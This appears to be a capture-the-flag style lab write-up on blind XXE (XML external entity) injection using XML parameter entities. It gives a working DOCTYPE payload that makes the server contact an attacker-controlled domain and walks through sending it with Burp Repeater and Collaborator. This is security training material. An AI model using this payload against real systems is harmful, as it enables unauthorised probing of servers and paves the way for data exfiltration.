## Introduction
- Sometimes, XXE attacks using regular entities are blocked, due to some input validation by the application or some hardening of the XML parser that is being used. In this situation, you might be able to use XML parameter entities instead.
- XML parameter entities are a special kind of XML entity which can only be referenced elsewhere within the DTD.

**For present purposes, you only need to know two things**
First, the declaration of an XML parameter entity includes the percent character before the entity name:
```js
<!ENTITY % myparameterentity "my parameter entity value" >
```

And second, parameter entities are referenced using the percent character instead of the usual ampersand:
```js
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
- This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD.
- This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful.

## Steps to solve lab
### Desc - Blind XXE with out-of-band interaction via XML parameter entities
**Our end goal** - 

1. Now, first send the `POST /product/stock` to burp "Repeater".
![[XXE10.png]]

**In Repeater** - 
![[XXE11.png]]

2. Now, add Burp collaborator domain with `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>` to get a DNS as well as HTTP request to your burp Collaborator server.
![[XXE12.png]]


3. After sennding the above request, switch to Burp collaborator and click on "Poll Now" to see HTTP as well as DNS request.
![[XXE13.png]]

